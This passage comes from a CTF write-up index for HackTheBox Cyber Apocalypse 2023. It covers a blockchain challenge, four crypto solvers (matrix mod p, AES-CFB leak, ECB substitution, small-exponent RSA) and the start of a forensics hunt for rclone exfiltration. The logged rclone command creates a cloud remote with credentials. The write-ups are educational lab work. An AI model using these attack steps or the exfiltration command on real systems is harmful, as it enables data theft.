data\nw3.eth.send_transaction({'to': target, 'from': wallet, 'data':'abcd'})\n\n\n# Second Shot\n# This transaction will trigger receive because it has no data\nw3.eth.send_transaction({'to': target, 'from': wallet})\n</code></pre><p></p> <p>And for the third shot which is a normal function and we can call it directly I used web3 cli The address is ShootingArea contact address </p><pre><code>web3 contract call --address '0x5094b5864dbB733a98E2A201fd7419F4e908be7B' --abi ShootingArea.abi --function third\n</code></pre><p></p> <p>After all these we can get the flag </p><pre><code>nc 165.22.116.7 31860\n1 - Connection information\n2 - Restart Instance\n3 - Get flag\naction? 3\nHTB{f33l5_n1c3_h1771n6_y0ur_74r6375}\n</code></pre><p></p> <p>And here is the flag </p><pre><code>HTB{f33l5_n1c3_h1771n6_y0ur_74r6375}\n</code></pre><p></p> <p>Authors - Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/crypto/inside_the_matrix/","title":"inside the matrix","text":""},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/crypto/inside_the_matrix/#1-challenge-code-and-description","title":"1 - Challenge code and Description","text":"<pre><code>As you deciphered the Matrix, you discovered that the astronomy scientist had observed that certain stars were not real.\nHe had created two 5x5 matrices with values based on the time the stars were bright, but after some time, the stars stopped emitting light.\nNonetheless, he had managed to capture every matrix until then and created an algorithm that simulated their generation.\nHowever, he could not understand what was hidden behind them as he was missing something.\nHe believed that if he could understand the stars, he would be able to locate the secret tombs where the relic was hidden.\n</code></pre> <p>source.py: </p><pre><code>from sage.all_cmdline import *\n# from utils import ascii_print\nimport os\n\nFLAG = b\"HTB{????????????????????}\"\nassert len(FLAG) == 25\n\n\nclass Book:\n\n    def __init__(self):\n        self.size = 5\n        self.prime = None\n\n    def parse(self, pt: bytes):\n        pt = [b for b in pt]\n        return matrix(GF(self.prime), self.size, self.size, pt)\n\n    def generate(self):\n        key = os.urandom(self.size**2)\n        return self.parse(key)\n\n    def rotate(self):\n        self.prime = random_prime(2**6, False, 2**4)\n\n    def encrypt(self, message: bytes):\n        self.rotate()\n        key = self.generate()\n        message = self.parse(message)\n        ciphertext = message * key\n        return ciphertext, key\n\n\ndef menu():\n    print(\"Options:\\n\")\n    print(\"[L]ook at page\")\n    print(\"[T]urn page\")\n    print(\"[C]heat\\n\")\n    option = input(\"&gt; \")\n    return option\n\n\ndef main():\n    book = Book()\n    ciphertext, key = book.encrypt(FLAG)\n    page_number = 1\n\n    while True:\n        option = menu()\n        if option == \"L\":\n            # ascii_print(ciphertext, key, page_number)\n            print(ciphertext, key, page_number)\n        elif option == \"T\":\n            ciphertext, key = book.encrypt(FLAG)\n            page_number += 2\n            print()\n        elif option == \"C\":\n            print(f\"\\n{list(ciphertext)}\\n{list(key)}\\n\")\n        else:\n            print(\"\\nInvalid option!\\n\")\n\n\nif __name__ == \"__main__\":\n    try:\n        main()\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n</code></pre><p></p> <p>Let's explore the code first 1. It generates a random prime number from 16 to 64 (17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61) named <code>P</code> 2. Then it generates two matrix in finite field of P first is the flag characters named <code>M</code> second one is the key named <code>K</code> 3. Then it multiply two matrix and generates a ciphertext matrix named <code>C</code> <code>C = M * K</code></p> <p>Also we have a remote instance which gives us three options:\\</p> <ol> <li>L which shows current encrypted text <code>C</code> and the key <code>K</code></li> <li>T generates new <code>K</code> and <code>C</code> for flag matrix <code>M</code></li> <li>C which show <code>C &amp; K</code> in list format</li> </ol>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/crypto/inside_the_matrix/#2-solution","title":"2 - Solution","text":"<p>here we have an equation like this:</p> <pre><code>C = M * K % P\n</code></pre> <p>We can solve this equation with sage like this and find M </p><pre><code>R = IntegerModRing(59)\nC = Matrix(R, [[20, 22, 9, 10, 55],[5, 49, 30, 31, 28],[17, 22, 23, 31, 41],[30, 19, 31, 8, 21],[10, 44, 48, 32, 22]])\nK = Matrix(R, [[23, 22, 54, 16, 53],[19, 58, 25, 10, 33],[44, 11, 34, 14, 28],[8, 56, 15, 21, 45],[15, 26, 13, 26, 9]])\nM = C.solve_left(K)\n\nprint(M)\n</code></pre><p></p> <p>But how to find <code>P</code>. we can simply bruteforce it or we can use T option for remote instance couple of times to get an element of for example 58 or 60 to ensure that the P is 59 or 61 I generated several ciphertexts and for one I assumed the P is 59 so I generated the matrix <code>M</code> with above equations with value <code>P=59</code> and here is the matrix M:</p> <pre><code>[13 25  7  5 49]\n[48 48 48 36  5]\n[57 36 55 45 51]\n[36 56 57 52 55]\n[56 33 33 33  7]\n</code></pre> <p>We can confirm the <code>M</code> and prime <code>P=59</code> with: </p><pre><code>ord('H') = 72 % 59 == 13\nord('T') = 84 % 59 == 25\nord('B') = 66 % 59 == 7\nord('{') = 123 % 59 == 5\n</code></pre><p></p> <p>After that with trial and error to find exact value of the flag characters and here is the code I used</p> <pre><code>message = [13,25,7,5,49,48,48,48,36,5,57,36,55,45,51,36,56,57,52,55,56,33,33,33,7]\nmessage = [13+p,25+p,7+p,5+2*p,49+p,48,48,48+p,36+p,5+p,57+p,36+p,55,45+p,51,36+p,56+p,57+p,52,55+p,56+p,33,33,33,7+2*p]\n\nfor m in message:\n    print(chr(m), end=\"\") \n\nprint()\n</code></pre> <p>And here os the flag </p><pre><code>HTB{l00k_@t_7h3_st4rs!!!}\n</code></pre><p></p> <p>According to this amazing writeup You can also grab several M matrix with different <code>P</code> values and use Chinese Remainder Theorem to find exact value of flags without trial and error</p> <p>Authors - Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/crypto/multipage_recyclings/","title":"multipage recyclings","text":""},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/crypto/multipage_recyclings/#1-challenge-code-and-description","title":"1 - Challenge code and Description","text":"<pre><code>As your investigation progressed, a clue led you to a local bar where you met an undercover agent with valuable information.\nHe spoke of a famous astronomy scientist who lived in the area and extensively studied the relic.\nThe scientist wrote a book containing valuable insights on the relic's location, but encrypted it before he disappeared to keep it safe from malicious intent.\nThe old man disclosed that the book was hidden in the scientist's house and revealed two phrases that the scientist rambled about before vanishing.\n</code></pre> <p>source.py </p><pre><code>from Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\nimport random, os\n\nFLAG = b'HTB{??????????????????????}'\n\n\nclass CAES:\n\n    def __init__(self):\n        self.key = os.urandom(16)\n        self.cipher = AES.new(self.key, AES.MODE_ECB)\n\n    def blockify(self, message, size):\n        return [message[i:i + size] for i in range(0, len(message), size)]\n\n    def xor(self, a, b):\n        return b''.join([bytes([_a ^ _b]) for _a, _b in zip(a, b)])\n\n    def encrypt(self, message):\n        iv = os.urandom(16)\n\n        ciphertext = b''\n        plaintext = iv\n\n        blocks = self.blockify(message, 16)\n        for block in blocks:\n            ct = self.cipher.encrypt(plaintext)\n            encrypted_block = self.xor(block, ct)\n            ciphertext += encrypted_block\n            plaintext = encrypted_block\n\n        return ciphertext\n\n    def leak(self, blocks):\n        r = random.randint(0, len(blocks) - 2)\n        leak = [self.cipher.encrypt(blocks[i]).hex() for i in [r, r + 1]]\n        return r, leak\n\n\ndef main():\n    aes = CAES()\n    message = pad(FLAG * 4, 16)\n\n    ciphertext = aes.encrypt(message)\n    ciphertext_blocks = aes.blockify(ciphertext, 16)\n\n    r, leak = aes.leak(ciphertext_blocks)\n\n    with open('output.txt', 'w') as f:\n        f.write(f'ct = {ciphertext.hex()}\\nr = {r}\\nphrases = {leak}\\n')\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre><p></p> <p>output.txt </p><pre><code>ct = bc9bc77a809b7f618522d36ef7765e1cad359eef39f0eaa5dc5d85f3ab249e788c9bc36e11d72eee281d1a645027bd96a363c0e24efc6b5caa552b2df4979a5ad41e405576d415a5272ba730e27c593eb2c725031a52b7aa92df4c4e26f116c631630b5d23f11775804a688e5e4d5624\nr = 3\nphrases = ['8b6973611d8b62941043f85cd1483244', 'cf8f71416111f1e8cdee791151c222ad']\n</code></pre><p></p>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/crypto/multipage_recyclings/#2-solution","title":"2 - Solution","text":"<p>Here we have a AES-CFB mode encryption and the output is like above and our message is actually the repition of the flag 4 times\\ We also have some leaks which is encryption of encrypted message according to aes-cfb decryption process we should encrypt previous cipher text and xor it with current ciphertext to recover the message\\ Here in leaks we have blocksp[3] and blocks[4] encrypton so if we xor blocks[4] with leaks[0] and blocks[5] with leaks[1] we should get two decrypted blocks of the message</p> <pre><code>d41e405576d415a5272ba730e27c593e ^ 8b6973611d8b62941043f85cd1483244 = _w34k_w17h_l34kz\nb2c725031a52b7aa92df4c4e26f116c6 ^ cf8f71416111f1e8cdee791151c222ad = }HTB{CFB_15_w34k\n</code></pre> <p>So here is the flag: </p><pre><code>HTB{CFB_15_w34k_w17h_l34kz}\n</code></pre><p></p> <p>Authors - Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/crypto/perfect_synchronization/","title":"perfect synchronization","text":""},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/crypto/perfect_synchronization/#1-challenge-code-and-description","title":"1 - Challenge code and Description","text":"<pre><code>The final stage of your initialization sequence is mastering cutting-edge technology tools that can be life-changing.\nOne of these tools is quipqiup, an automated tool for frequency analysis and breaking substitution ciphers.\nThis is the ultimate challenge, simulating the use of AES encryption to protect a message. Can you break it?\n</code></pre> <p>source.py </p><pre><code>from os import urandom\nfrom Crypto.Cipher import AES\nfrom secret import MESSAGE\n\nassert all([x.isupper() or x in '{_} ' for x in MESSAGE])\n\n\nclass Cipher:\n\n    def __init__(self):\n        self.salt = urandom(15)\n        key = urandom(16)\n        self.cipher = AES.new(key, AES.MODE_ECB)\n\n    def encrypt(self, message):\n        return [self.cipher.encrypt(c.encode() + self.salt) for c in message]\n\n\ndef main():\n    cipher = Cipher()\n    encrypted = cipher.encrypt(MESSAGE)\n    encrypted = \"\\n\".join([c.hex() for c in encrypted])\n\n    with open(\"output.txt\", 'w+') as f:\n        f.write(encrypted)\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre><p></p> <p>output.txt </p><pre><code>dfc8a2232dc2487a5455bda9fa2d45a1\n305d4649e3cb097fb094f8f45abbf0dc\nc87a7eb9283e59571ad0cb0c89a74379\n60e8373bfb2124aea832f87809fca596\nd178fac67ec4e9d2724fed6c7b50cd26\nc87a7eb9283e59571ad0cb0c89a74379\n34ece5ff054feccc5dabe9ae90438f9d\n457165130940ceac01160ac0ff924d86\n5d7185a6823ab4fc73f3ea33669a7bae\n61331054d82aeec9a20416759766d9d5\n5f122076e17398b7e21d1762a61e2e0a\n....................\n</code></pre><p></p>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/crypto/perfect_synchronization/#2-solution","title":"2 - Solution","text":"<ul> <li>We know that characters of the encrypted message is Upper letters and <code>{_}</code> which is for teh flag</li> <li>So the message is a text message containing the flag inside it with all upper letter characters.</li> <li>Each character of the message is being encrypted with AES ECB with same key.</li> <li>So each character is mapped to its encrypted version using AES-ECB and we can do statistical analysis.</li> <li>But first we should map these characters to single character random letters except '{_}' we also need space characters to perform statistical analysis</li> <li>How to solve this?</li> </ul> <p>Those AES outputs which has only one occurance are <code>{}</code>. so <code>fbe86a428051747607a35b44b1a3e9e9</code> is actually <code>{</code> and <code>c53ba24fbbe9e3dbdd6062b3aab7ed1a</code> is <code>}</code> We can guess <code>_</code> is only between <code>{}</code> inside flag and not other part of the message so those AES outputs which are between <code>fbe86a428051747607a35b44b1a3e9e9</code> and <code>c53ba24fbbe9e3dbdd6062b3aab7ed1a</code> is actually <code>_</code> For space the characrter before the flag first character is space and that is <code>61331054d82aeec9a20416759766d9d5</code>.</p> <p>and we should map remaining patterns to a random letter. Here is final script</p> <p>solve.py </p><pre><code>import json\n\ndatas = open('./crypto_perfect_synchronization/output.txt', 'r').readlines()\nraw = open('./crypto_perfect_synchronization/output.txt', 'r').read().strip()\ndata = []\n\nfor d in datas:\n    data.append(d.strip())\n\nstats = {}\nfor d in data:\n    if d in stats.keys():\n        stats[d] += 1\n    else:\n        stats[d] = 1\n\nletters = set(data)\n\nchars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ '\nprint(len(chars))\n\nraw = raw.replace('fbe86a428051747607a35b44b1a3e9e9', '{')\nraw = raw.replace('a94f49727cf771a85831bd03af1caaf5', '_')\nraw = raw.replace('c53ba24fbbe9e3dbdd6062b3aab7ed1a', '}')\nraw = raw.replace('61331054d82aeec9a20416759766d9d5', ' ')\n\nindex = 0\noutput = ''\nfor d in letters:\n    if d in['fbe86a428051747607a35b44b1a3e9e9','a94f49727cf771a85831bd03af1caaf5','c53ba24fbbe9e3dbdd6062b3aab7ed1a']:\n        continue\n    raw = raw.replace(d, chars[index]).strip()\n    index += 1\n\nprint(raw.replace('\\n', ''))\n</code></pre><p></p> <p>result: </p><pre><code>LKBCVBRMP XRXZPNDN DN SXNBE OR TYB LXMT TYXT DR XRP UDFBR NTKBTMY OL IKDTTBR ZXRUVXUB MBKTXDR ZBTTBKN XRE MOQSDRXTDORN OL ZBTTBKN OMMVK IDTY FXKPDRU LKBCVBRMDBN QOKBOFBK TYBKB DN X MYXKXMTBKDNTDM EDNTKDSVTDOR OL ZBTTBKN TYXT DN KOVUYZP TYB NXQB LOK XZQONT XZZ NXQGZBN OL TYXT ZXRUVXUB DR MKPGTXRXZPNDN LKBCVBRMP XRXZPNDN XZNO HROIR XN MOVRTDRU ZBTTBKN DN TYB NTVEP OL TYB LKBCVBRMP OL ZBTTBKN OK UKOVGN OL ZBTTBKN DR X MDGYBKTBJT TYB QBTYOE DN VNBE XN XR XDE TO SKBXHDRU MZXNNDMXZ MDGYBKN LKBCVBRMP XRXZPNDN KBCVDKBN ORZP X SXNDM VREBKNTXREDRU OL TYB NTXTDNTDMN OL TYB GZXDRTBJT ZXRUVXUB XRE NOQB GKOSZBQ NOZFDRU NHDZZN XRE DL GBKLOKQBE SP YXRE TOZBKXRMB LOK BJTBRNDFB ZBTTBK SOOHHBBGDRU EVKDRU IOKZE IXK DD SOTY TYB SKDTDNY XRE TYB XQBKDMXRN KBMKVDTBE MOEBSKBXHBKN SP GZXMDRU MKONNIOKE GVWWZBN DR QXAOK RBINGXGBKN XRE KVRRDRU MORTBNTN LOK IYO MOVZE NOZFB TYBQ TYB LXNTBNT NBFBKXZ OL TYB MDGYBKN VNBE SP TYB XJDN GOIBKN IBKB SKBXHXSZB VNDRU LKBCVBRMP XRXZPNDN LOK BJXQGZB NOQB OL TYB MORNVZXK MDGYBKN VNBE SP TYB AXGXRBNB QBMYXRDMXZ QBTYOEN OL ZBTTBK MOVRTDRU XRE NTXTDNTDMXZ XRXZPNDN UBRBKXZZP YTS{X_NDQGZB_NVSNTDTVTDOR_DN_IBXH} MXKE TPGB QXMYDRBKP IBKB LDKNT VNBE DR IOKZE IXK DD GONNDSZP SP TYB VN XKQPN NDN TOEXP TYB YXKE IOKH OL ZBTTBK MOVRTDRU XRE XRXZPNDN YXN SBBR KBGZXMBE SP MOQGVTBK NOLTIXKB IYDMY MXR MXKKP OVT NVMY XRXZPNDN DR NBMOREN IDTY QOEBKR MOQGVTDRU GOIBK MZXNNDMXZ MDGYBKN XKB VRZDHBZP TO GKOFDEB XRP KBXZ GKOTBMTDOR LOK MORLDEBRTDXZ EXTX GVWWZB GVWWZB GVWWZB\n</code></pre><p></p> <p>Now we can use quipqiup to find the original text from output abow and here is the original text: </p><pre><code>    FREQUENCY ANALYSIS IS BASED ON THE FACT THAT IN ANY GIVEN STRETCH OF WRITTEN LANGUAGE CERTAIN LETTERS AND COMBINATIONS OF LETTERS OCCUR WITH VARYING FREQUENCIES MOREOVER THERE IS A CHARACTERISTIC DISTRIBUTION OF LETTERS THAT IS ROUGHLY THE SAME FOR ALMOST ALL SAMPLES OF THAT LANGUAGE IN CRYPTANALYSIS FREQUENCY ANALYSIS ALSO KNOWN AS COUNTING LETTERS IS THE STUDY OF THE FREQUENCY OF LETTERS OR GROUPS OF LETTERS IN A CIPHERTEXT THE METHOD IS USED AS AN AID TO BREAKING CLASSICAL CIPHERS FREQUENCY ANALYSIS REQUIRES ONLY A BASIC UNDERSTANDING OF THE STATISTICS OF THE PLAINTEXT LANGUAGE AND SOME PROBLEM SOLVING SKILLS AND IF PERFORMED BY HAND TOLERANCE FOR EXTENSIVE LETTER BOOKKEEPING DURING WORLD WAR II BOTH THE BRITISH AND THE AMERICANS RECRUITED CODEBREAKERS BY PLACING CROSSWORD PUZZLES IN MAJOR NEWSPAPERS AND RUNNING CONTESTS FOR WHO COULD SOLVE THEM THE FASTEST SEVERAL OF THE CIPHERS USED BY THE AXIS POWERS WERE BREAKABLE USING FREQUENCY ANALYSIS FOR EXAMPLE SOME OF THE CONSULAR CIPHERS USED BY THE JAPANESE MECHANICAL METHODS OF LETTER COUNTING AND STATISTICAL ANALYSIS GENERALLY HTB{A_SIMPLE_SUBSTITUTION_IS_WEAK} CARD TYPE MACHINERY WERE FIRST USED IN WORLD WAR II POSSIBLY BY THE US ARMYS SIS TODAY THE HARD WORK OF LETTER COUNTING AND ANALYSIS HAS BEEN REPLACED BY COMPUTER SOFTWARE WHICH CAN CARRY OUT SUCH ANALYSIS IN SECONDS WITH MODERN COMPUTING POWER CLASSICAL CIPHERS ARE UNLIKELY TO PROVIDE ANY REAL PROTECTION FOR CONFIDENTIAL DATA PUZZLE PUZZLE PUZZLE\n</code></pre><p></p> <p>And here is the flag: </p><pre><code>HTB{A_SIMPLE_SUBSTITUTION_IS_WEAK}\n</code></pre><p></p> <p>Authors - Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/crypto/small_steps/","title":"small steps","text":""},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/crypto/small_steps/#1-challenge-code-and-description","title":"1 - Challenge Code and Description","text":"<pre><code>As you continue your journey, you must learn about the encryption method the aliens used to secure their communication from eavesdroppers.\nThe engineering team has designed a challenge that emulates the exact parameters of the aliens' encryption system, complete with instructions and a code snippet to connect to a mock alien server.\nYour task is to break it.\n</code></pre> <pre><code>from Crypto.Util.number import getPrime, bytes_to_long\n\nFLAG = b\"HTB{???????????????}\"\nassert len(FLAG) == 20\n\n\nclass RSA:\n\n    def __init__(self):\n        self.q = getPrime(256)\n        self.p = getPrime(256)\n        self.n = self.q * self.p\n        self.e = 3\n\n    def encrypt(self, plaintext):\n        plaintext = bytes_to_long(plaintext)\n        return pow(plaintext, self.e, self.n)\n\n\ndef menu():\n    print('[E]ncrypt the flag.')\n    print('[A]bort training.\\n')\n    return input('&gt; ').upper()[0]\n\n\ndef main():\n    print('This is the second level of training.\\n')\n    while True:\n        rsa = RSA()\n        choice = menu()\n\n        if choice == 'E':\n            encrypted_flag = rsa.encrypt(FLAG)\n            print(f'\\nThe public key is:\\n\\nN: {rsa.n}\\ne: {rsa.e}\\n')\n            print(f'The encrypted flag is: {encrypted_flag}\\n')\n        elif choice == 'A':\n            print('\\nGoodbye\\n')\n            exit(-1)\n        else:\n            print('\\nInvalid choice!\\n')\n            exit(-1)\n\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/crypto/small_steps/#2-solution","title":"2 - Solution","text":"<ul> <li>Here we have a simple RSA encryption with small e (3) which is insecure.</li> <li>because <code>c = m**3 % n</code> is smaller than <code>n</code> so <code>c == m ** 3</code> and we can compute m by getting 3rd root of <code>c</code>.</li> </ul> <pre><code>from Crypto.Util.number import *\n\ndef nth_root(x, n):\n    # Start with some reasonable bounds around the nth root.\n    upper_bound = 1\n    while upper_bound ** n &lt;= x:\n        upper_bound *= 2\n    lower_bound = upper_bound // 2\n    # Keep searching for a better result as long as the bounds make sense.\n    while lower_bound &lt; upper_bound:\n        mid = (lower_bound + upper_bound) // 2\n        mid_nth = mid ** n\n        if lower_bound &lt; mid and mid_nth &lt; x:\n            lower_bound = mid\n        elif upper_bound &gt; mid and mid_nth &gt; x:\n            upper_bound = mid\n        else:\n            # Found perfect nth root.\n            return mid\n    return mid + 1\n\nn = 4994987314155600304691453574807875996150564799718996509392679134987280603555645591343927213497932548816960938243148072674115512672389479749171011850599071\ne = 3\nc = 70407336670535933819674104208890254240063781538460394662998902860952366439176467447947737680952277637330523818962104685553250402512989897886053\n\nm = nth_root(c, e)\n\n\nflag = long_to_bytes(m)\nprint(flag)\n</code></pre> <p>And here is the flag: </p><pre><code>HTB{5ma1l_E-xp0n3nt}\n</code></pre><p></p> <p>Authors - Kourosh Rajabzadeh</p>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/forensics/packet_cyclone/","title":"packet cyclone","text":""},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/forensics/packet_cyclone/#1-challenge-code-and-description","title":"1 - Challenge code and description","text":"<pre><code>Pandora's friend and partner, Wade, is the one that leads the investigation into the relic's location.\nRecently, he noticed some weird traffic coming from his host.\nThat led him to believe that his host was compromised.\nAfter a quick investigation, his fear was confirmed.\nPandora tries now to see if the attacker caused the suspicious traffic during the exfiltration phase.\nPandora believes that the malicious actor used rclone to exfiltrate Wade's research to the cloud.\nUsing the tool called \"chainsaw\" and the sigma rules provided, can you detect the usage of rclone from the event logs produced by Sysmon?\nTo get the flag, you need to start and connect to the docker service and answer all the questions correctly.\n</code></pre> <p>We are given some windows event viewer logs and some sigma rules for hunting inside logs\\ The challenge description give us some hints to use a tool called <code>chainsaw</code> with some custom sigma rules to detect data exfiltiration with <code>rclone</code>\\ Actually rclone is a cli tool for data sync with cloud platforms.</p>"},{"location":"CTF/writeups/2023/cyber-apocalypse-2023/forensics/packet_cyclone/#2-solution","title":"2 - Solution","text":"<p>Let's use chainsaw and two custom sigma rules <code>rclone_config_creation.yaml</code> and <code>rclone_execution.yaml</code> to hunt through these windows logs to detect data exfiltiration using <code>rclone</code></p> <pre><code>chainsaw hunt Logs/ -s sigma_rules/ --mapping ./chainsaw/mappings/sigma-event-logs-all.yml\n# Logs : the windows event viewer directory which is inside challenge files\n# sigma_rules : which are two custom sigma rules inside challenge files for discovering rclone config creationg and execution\n# mapping : I used chainsaw mapping files\n</code></pre> <p>And here is the result</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         detections         \u2502 count \u2502  Event.System.Provider   \u2502 Event ID \u2502 Record ID \u2502           Event Data           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 \u2023 Rclone Execution via     \u2502 1     \u2502 Microsoft-Windows-Sysmon \u2502 1        \u2502 76        \u2502 ---                            \u2502\n\u2502 Command Line or PowerShell \u2502       \u2502                          \u2502          \u2502           \u2502 CommandLine: \"\\\"C:\\\\Users\\\\wad \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 e\\\\AppData\\\\Local\\\\Temp\\\\rclon \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 e-v1.61.1-windows-amd64\\\\rclon \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 e.exe\\\" config create remote m \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ega user majmeret@protonmail.c \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 om pass FBMeavdiaFZbWzpMqIVhJC \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 GXZ5XXZI1qsU3EjhoKQw0rEoQqHyI\" \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Company: \"https://rclone.org\"  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 CurrentDirectory: \"C:\\\\Users\\\\ \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 wade\\\\AppData\\\\Local\\\\Temp\\\\rc \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 lone-v1.61.1-windows-amd64\\\\\"  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Description: Rsync for cloud s \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 torage                         \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 FileVersion: 1.61.1            \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Hashes: SHA256=E94901809FF7CC5 \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 168C1E857D4AC9CBB339CA1F6E21DC \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 CE95DFB8E28DF799961            \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Image: \"C:\\\\Users\\\\wade\\\\AppDa \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ta\\\\Local\\\\Temp\\\\rclone-v1.61. \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 1-windows-amd64\\\\rclone.exe\"   \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 IntegrityLevel: Medium         \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 LogonGuid: 10DA3E43-D892-63F8- \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 4B6D-030000000000              \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 LogonId: \"0x36d4b\"             \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 OriginalFileName: rclone.exe   \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentCommandLine: \"\\\"C:\\\\Wind \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ows\\\\System32\\\\WindowsPowerShe \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ll\\\\v1.0\\\\powershell.exe\\\" \"   \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentImage: \"C:\\\\Windows\\\\Sys \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 tem32\\\\WindowsPowerShell\\\\v1.0 \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 \\\\powershell.exe\"              \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentProcessGuid: 10DA3E43-D8 \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 D2-63F8-9B00-000000000900      \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentProcessId: 5888          \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ParentUser: \"DESKTOP-UTDHED2\\\\ \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 wade\"                          \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ProcessGuid: 10DA3E43-D92B-63F \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 8-B100-000000000900            \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 ProcessId: 3820                \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 Product: Rclone                \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 RuleName: \"-\"                  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 TerminalSessionId: 1           \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 User: \"DESKTOP-UTDHED2\\\\wade\"  \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 UtcTime: \"2023-02-24 15:35:07. \u2502\n\u2502                            \u2502       \u2502                          \u2502          \u2502           \u2502 336\"                           